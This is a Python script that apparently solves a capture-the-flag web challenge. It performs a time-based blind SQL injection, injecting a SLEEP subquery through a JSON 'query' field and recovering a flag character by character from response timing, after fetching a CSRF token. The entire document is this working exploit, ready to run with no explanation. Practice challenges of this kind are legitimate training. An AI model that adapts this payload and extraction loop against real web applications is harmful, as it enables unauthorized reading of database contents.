import requests, string, time, re

URL = 'http://web-17.challs.olicyber.it'
alph = "abcdef0123456789"

s = requests.Session()
r = s.get(URL + '/time')
csrf = re.search(r"csrf_token = '.*'",r.text).group().split("'")[1]
s.headers.update({'X-CSRFToken':csrf})
guess = ""
while True:
    for c in alph:
        tmp = guess + c 
        print(f"Guessing {tmp}")
        start = time.time()
        query = {
            "query":f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{tmp}%')='1"
        }
        r = s.post(URL + '/api/time',json=query)
        elapsed = time.time() - start
        if elapsed > 1:
            guess = tmp
            break
    else:
        print(f"flag found {bytes.fromhex(guess).decode()}")
        break